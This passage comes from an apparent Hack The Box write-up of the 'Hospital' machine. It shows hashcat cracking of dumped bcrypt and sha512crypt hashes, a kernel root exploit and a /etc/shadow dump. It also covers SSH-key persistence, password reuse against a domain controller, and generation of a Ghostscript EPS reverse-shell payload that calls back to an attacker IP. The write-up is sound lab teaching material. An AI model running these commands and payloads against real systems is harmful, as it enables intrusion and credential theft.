+</span></span><span style="display:flex;"><span>|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+</span></span><span style="display:flex;"><span>|  3 | hacker   | $2y$10$ZtQHkl5O10z7E8cJdJDjx.G4bJSX4djreKgPLN1jUdoxE7f8bdDMa | 2025-03-17 23:53:23 |
+</span></span><span style="display:flex;"><span>+----+----------+--------------------------------------------------------------+---------------------+
+</span></span><span style="display:flex;"><span>3 rows in set (0.001 sec)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>MariaDB [hospital]&gt;
+</span></span></code></pre></div><p>We find credentials. The signature <code>$2y$10$</code> looks like <code>bcrypt</code>. We can crack it with <code>hashcat</code> mode 3200</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo hashcat -m <span style="color:#ae81ff">3200</span> admin.hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: 14344385
+</span></span><span style="display:flex;"><span>* Bytes.....: 139921507
+</span></span><span style="display:flex;"><span>* Keyspace..: 14344385
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+</span></span><span style="display:flex;"><span>Hash.Target......: $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3...xcjMh2
+</span></span><span style="display:flex;"><span>Time.Started.....: Mon Mar 17 17:13:34 2025 (1 sec)
+</span></span><span style="display:flex;"><span>Time.Estimated...: Mon Mar 17 17:13:35 2025 (0 secs)
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 (100.00%)
+</span></span><span style="display:flex;"><span>Speed.#1.........:       73 H/s (5.21ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+</span></span><span style="display:flex;"><span>Progress.........: 16/14344385 (0.00%)
+</span></span><span style="display:flex;"><span>Rejected.........: 0/16 (0.00%)
+</span></span><span style="display:flex;"><span>Restore.Point....: 0/14344385 (0.00%)
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: 123456 -&gt; jessica
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 26%
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Started: Mon Mar 17 17:13:28 2025
+</span></span><span style="display:flex;"><span>Stopped: Mon Mar 17 17:13:36 2025
+</span></span></code></pre></div><p>We crack the admin hash as <code>123456</code>! We log into the website, but it&rsquo;s just the same upload functionality. We also try the HTTPS page, but no luck logging in. So we have a shell, and this is a Windows box, but we are logged in as <code>www-data</code> on  Ubuntu. Let&rsquo;s see if we are in a VM, we can query <code>/proc/cpuinfo</code> and check for the <code>hypervisor</code> flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www$ cat /proc/cpuinfo
+</span></span><span style="display:flex;"><span>processor       : 0
+</span></span><span style="display:flex;"><span>vendor_id       : AuthenticAMD
+</span></span><span style="display:flex;"><span>cpu family      : 25
+</span></span><span style="display:flex;"><span>model           : 1
+</span></span><span style="display:flex;"><span>model name      : AMD EPYC 7763 64-Core Processor
+</span></span><span style="display:flex;"><span>stepping        : 1
+</span></span><span style="display:flex;"><span>microcode       : 0xffffffff
+</span></span><span style="display:flex;"><span>cpu MHz         : 2445.405
+</span></span><span style="display:flex;"><span>cache size      : 512 KB
+</span></span><span style="display:flex;"><span>physical id     : 0
+</span></span><span style="display:flex;"><span>siblings        : 1
+</span></span><span style="display:flex;"><span>core id         : 0
+</span></span><span style="display:flex;"><span>cpu cores       : 1
+</span></span><span style="display:flex;"><span>apicid          : 0
+</span></span><span style="display:flex;"><span>initial apicid  : 0
+</span></span><span style="display:flex;"><span>fpu             : yes
+</span></span><span style="display:flex;"><span>fpu_exception   : yes
+</span></span><span style="display:flex;"><span>cpuid level     : 13
+</span></span><span style="display:flex;"><span>wp              : yes
+</span></span><span style="display:flex;"><span>flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt lm rep_good nopl cpuid extd_apicid pni cx16 hypervisor lahf_lm cr8_legacy 3dnowprefetch osvw topoext ibpb vmmcall arat
+</span></span><span style="display:flex;"><span>bugs            : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass
+</span></span><span style="display:flex;"><span>bogomips        : 4890.81
+</span></span><span style="display:flex;"><span>TLB size        : 2560 4K pages
+</span></span><span style="display:flex;"><span>clflush size    : 64
+</span></span><span style="display:flex;"><span>cache_alignment : 64
+</span></span><span style="display:flex;"><span>address sizes   : 43 bits physical, 48 bits virtual
+</span></span><span style="display:flex;"><span>power management:
+</span></span></code></pre></div><p>But aren&rsquo;t all HTB boxes VMs? I&rsquo;m actually not sure if we would see this flag in an actual Linux box on HTB. However, since HTB lists this box as Windows and our <code>nmap</code> scans line up with that too, I&rsquo;m learning towards this being a VM.</p>
+<p>Ok, so we are on an Ubuntu VM on the Linux box. How can we escape? I don&rsquo;t see any shares mounted. Let&rsquo;s do a ping sweep and see if we can ping any other machines. Maybe we are in a NAT network and can reach the host</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/media$ for i in {1..254} ;do (ping -c 1 192.168.5.$i | grep &#34;bytes from&#34; &amp;) ;done
+</span></span><span style="display:flex;"><span>64 bytes from 192.168.5.1: icmp_seq=1 ttl=128 time=0.443 ms
+</span></span><span style="display:flex;"><span>64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=0.025 ms
+</span></span></code></pre></div><p>Ok, let&rsquo;s transfer <code>nmap</code> over and see if we can scan this other address</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www$ chmod +x nmap
+</span></span><span style="display:flex;"><span>www-data@webserver:/var/www$ ./nmap 192.168.5.1
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-03-18 06:11 UTC
+</span></span><span style="display:flex;"><span>Unable to find nmap-services!  Resorting to /etc/services
+</span></span><span style="display:flex;"><span>Cannot find nmap-payloads. UDP payloads are disabled.
+</span></span><span style="display:flex;"><span>Nmap scan report for _gateway (192.168.5.1)
+</span></span><span style="display:flex;"><span>Host is up (0.0012s latency).
+</span></span><span style="display:flex;"><span>Not shown: 1145 filtered ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos
+</span></span><span style="display:flex;"><span>135/tcp  open  epmap
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>443/tcp  open  https
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd
+</span></span><span style="display:flex;"><span>593/tcp  open  unknown
+</span></span><span style="display:flex;"><span>636/tcp  open  ldaps
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Nmap done: 1 IP address (1 host up) scanned in 4.64 seconds
+</span></span><span style="display:flex;"><span>www-data@webserver:/var/www$
+</span></span></code></pre></div><p>Nice! That&rsquo;s definitely the DC then. However, what more can we actually do? Those ports are also exposed to us originally, so does this even further our access? Not sure where to go, so let&rsquo;s run <code>linpeas</code>, which says I am in a VM too</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>╔══════════╣ Protections
+</span></span><span style="display:flex;"><span>═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+</span></span><span style="display:flex;"><span>apparmor module is loaded.
+</span></span><span style="display:flex;"><span>═╣ AppArmor profile? .............. unconfined
+</span></span><span style="display:flex;"><span>═╣ is linuxONE? ................... s390x Not Found
+</span></span><span style="display:flex;"><span>═╣ grsecurity present? ............ grsecurity Not Found
+</span></span><span style="display:flex;"><span>═╣ PaX bins present? .............. PaX Not Found
+</span></span><span style="display:flex;"><span>═╣ Execshield enabled? ............ Execshield Not Found
+</span></span><span style="display:flex;"><span>═╣ SELinux enabled? ............... sestatus Not Found
+</span></span><span style="display:flex;"><span>═╣ Seccomp enabled? ............... disabled
+</span></span><span style="display:flex;"><span>═╣ User namespace? ................ enabled
+</span></span><span style="display:flex;"><span>═╣ Cgroup2 enabled? ............... enabled
+</span></span><span style="display:flex;"><span>═╣ Is ASLR enabled? ............... Yes
+</span></span><span style="display:flex;"><span>═╣ Printer? ....................... No
+</span></span><span style="display:flex;"><span>═╣ Is this a virtual machine? ..... Yes (microsoft)
+</span></span></code></pre></div><p>The only, I see, to get out of this VM is to get root. Let&rsquo;s search for any kernel vulnerabilities</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www/html/uploads$ uname -a
+</span></span><span style="display:flex;"><span>Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+</span></span></code></pre></div><p>When we Google the kernel version, we eventually land on <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">CVE-2023-2640-CVE-2023-32629</a>. We clone it, transfer over the shell script, run it, and get a root shell!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@webserver:/var/www/html/uploads$ ./exploit.sh
+</span></span><span style="display:flex;"><span>[+] You should be root now
+</span></span><span style="display:flex;"><span>[+] Type &#39;exit&#39; to finish and leave the house cleaned
+</span></span><span style="display:flex;"><span>root@webserver:/var/www/html/uploads# id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Let&rsquo;s establish some means of persistence as our shell keeps dying after a while. We simply copy over our public key into the <code>authorized_keys</code> file in root&rsquo;s SSH directory. Then we can SSH in as root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh root@10.10.11.241
+</span></span><span style="display:flex;"><span>The authenticity of host &#39;10.10.11.241 (10.10.11.241)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span>ED25519 key fingerprint is SHA256:4EI5pSeg97Oajb3INOzVG2LSJZkL6lRMYg+76QCGF64.
+</span></span><span style="display:flex;"><span>This key is not known by any other names.
+</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;10.10.11.241&#39; (ED25519) to the list of known hosts.
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 23.04 (GNU/Linux 5.19.0-35-generic x86_64)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  System information as of Tue Mar 18 07:57:18 AM UTC 2025
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  System load:  0.0               Processes:             142
+</span></span><span style="display:flex;"><span>  Usage of /:   72.1% of 6.06GB   Users logged in:       0
+</span></span><span style="display:flex;"><span>  Memory usage: 53%               IPv4 address for eth0: 192.168.5.2
+</span></span><span style="display:flex;"><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>0 updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check for new updates run: sudo apt update
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Last login: Mon Nov 13 20:45:18 2023
+</span></span><span style="display:flex;"><span>root@webserver:~#
+</span></span></code></pre></div><p>Remember, there is another user on this VM , <code>drwilliams</code>. Maybe if we can grab this user&rsquo;s password, we can use it to further our access onto the main windows machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@webserver:~# cat /etc/shadow
+</span></span><span style="display:flex;"><span>root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+</span></span><span style="display:flex;"><span>daemon:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>bin:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>sys:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>sync:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>games:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>man:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>lp:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>mail:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>news:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>uucp:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>proxy:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>www-data:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>backup:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>list:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>irc:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>_apt:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>nobody:*:19462:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-network:!*:19462::::::
+</span></span><span style="display:flex;"><span>systemd-timesync:!*:19462::::::
+</span></span><span style="display:flex;"><span>messagebus:!:19462::::::
+</span></span><span style="display:flex;"><span>systemd-resolve:!*:19462::::::
+</span></span><span style="display:flex;"><span>pollinate:!:19462::::::
+</span></span><span style="display:flex;"><span>sshd:!:19462::::::
+</span></span><span style="display:flex;"><span>syslog:!:19462::::::
+</span></span><span style="display:flex;"><span>uuidd:!:19462::::::
+</span></span><span style="display:flex;"><span>tcpdump:!:19462::::::
+</span></span><span style="display:flex;"><span>tss:!:19462::::::
+</span></span><span style="display:flex;"><span>landscape:!:19462::::::
+</span></span><span style="display:flex;"><span>fwupd-refresh:!:19462::::::
+</span></span><span style="display:flex;"><span>drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+</span></span><span style="display:flex;"><span>lxd:!:19612::::::
+</span></span><span style="display:flex;"><span>mysql:!:19620::::::
+</span></span></code></pre></div><p>It&rsquo;s a SHA-512 hash, but let&rsquo;s try to crack it because if we can then we can further our access</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo hashcat -m <span style="color:#ae81ff">1800</span> drwilliams.hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat (v6.2.6) starting
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+</span></span><span style="display:flex;"><span>Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
+</span></span><span style="display:flex;"><span>Time.Started.....: Mon Mar 17 21:28:17 2025 (1 min, 41 secs)
+</span></span><span style="display:flex;"><span>Time.Estimated...: Mon Mar 17 21:29:58 2025 (0 secs)
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 (100.00%)
+</span></span><span style="display:flex;"><span>Speed.#1.........:     2120 H/s (11.02ms) @ Accel:512 Loops:256 Thr:1 Vec:4
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+</span></span><span style="display:flex;"><span>Progress.........: 214528/14344385 (1.50%)
+</span></span><span style="display:flex;"><span>Rejected.........: 0/214528 (0.00%)
+</span></span><span style="display:flex;"><span>Restore.Point....: 214016/14344385 (1.49%)
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: raycharles -&gt; pl@yboy
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 94%
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Started: Mon Mar 17 21:27:42 2025
+</span></span><span style="display:flex;"><span>Stopped: Mon Mar 17 21:30:00 2025
+</span></span></code></pre></div><p>And we crack it! Maybe <code>drwilliams</code> is also a user on the windows box</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.241 -u drwilliams -p <span style="color:#e6db74">&#39;qwe123!@#&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
+</span></span></code></pre></div><p>She is! We check out SMB but don&rsquo;t see any readable shares. Let&rsquo;s try to log into the website on 8080
+<img src="/images/Hospital/email.png" alt="Email"></p>
+<p>We see an email from a <code>drbrown</code>. We can also find this user with <code>netexec</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.241 -u drwilliams -p <span style="color:#e6db74">&#39;qwe123!@#&#39;</span> --users
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               Administrator                 2023-09-12 07:58:44 0       Built-in account for administering the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               krbtgt                        2023-09-05 19:58:33 0       Key Distribution Center Service Account
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               $431000-R1KSAI1DGHMH          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_0559ce7ac4be4fc6a          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_bb030ff39b6c4a2db          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_9326b57ae8ea44309          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_b1b9e7f83082488ea          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_e5b6f3aed4da4ac98          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_75554ef7137f41d68          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_6e9de17029164abdb          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_5faa2be1160c4ead8          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               SM_2fe3f3cbbafa4566a          &lt;never&gt;             0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               drbrown                       2023-09-06 14:53:27 0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               drwilliams                    2023-09-08 17:33:46 0
+</span></span><span style="display:flex;"><span>SMB         10.10.11.241    445    DC               [*] Enumerated 15 local users: HOSPITAL
+</span></span></code></pre></div><p>In the email, we see that he asks for a <code>eps</code> file which will be used with GhostScript. A quick Google reveals a <a href="https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit">command injection</a> exploit. Let&rsquo;s try to get a reverse shell. First we generate a our <code>eps</code> payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.14.51 -port <span style="color:#ae81ff">9443</span> --filename needle_designs --extension eps
+</span></span><span style="display:flex;"><span>[+] Generated EPS payload file: needle_designs.eps
+</span></span></code></pre></div><p>Then we reply to the email and attach the file
+<img src="/images/Hospital/eps.png" alt="Eps"></p>
+<p>But we don&rsquo;t get any calls back? Reading the source code (and the GitHub), I realized that the built-in <code>revshell</code> function is for Unix, not Windows. Let&rsquo;s try a simple <code>ping</code> payload and see if we get anything</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 CVE_2023_36664_exploit.py --inject --payload <span style="color:#e6db74">&#34;ping 10.10.14.51&#34;</span> --filename file.eps
+</span></span><span style="display:flex;"><span>[+] Payload successfully injected into file.eps.
+</span></span></code></pre></div><p>Then we set up <code>tcpdump</code>and send our file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo tcpdump -ni tun0
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>10:58:56.420943 IP 10.10.11.241 &gt; 10.10.14.51: ICMP echo request, id 1, seq 1, length 40
+</span></span><span style="display:flex;"><span>10:58:56.420994 IP 10.10.14.51 &gt; 10.10.11.241: ICMP echo reply, id 1, seq 1, length 40
+</span></span><span style="display:flex;"><span>10:58:57.422968 IP 10.10.11.241 &gt; 10.10.14.51: ICMP echo request, id 1, seq 2, length 40
+</span></span><span style="display:flex;"><span>10:58:57.423010 IP 10.10.14.51 &gt; 10.10.11.241: ICMP echo reply, id 1, seq 2, length 40
+</span></span><span style="display:flex;"><span>10:58:58.426380 IP 10.10.11.241 &gt; 10.10.14.51: ICMP echo request, id 1, seq 3, length 40
+</span></span><span style="display:flex;"><span>10:58:58.426392 IP 10.10.14.51 &gt; 10.10.11.241: ICMP echo reply, id 1, seq 3, length 40
+</span></span><span style="display:flex;"><span>10:58:59.427094 IP 10.10.11.241 &gt; 10.10.14.51: ICMP echo request, id 1, seq 4, length 40
+</span></span><span style="display:flex;"><span>10:58:59.427138 IP 10.10.14.51 &gt; 10.10.11.241: ICMP echo reply, id 1, seq 4, length 40
+</span></span></code></pre></div><p>Nice! we see the target is pining back to our host. Now let&rsquo;s try to get a reverse shell. We can use <a href="https://www.revshells.com/">revshells</a> to generate a PowerShell reverse shell, then generate the malicious <code>eps</code> file with the PoC</p>
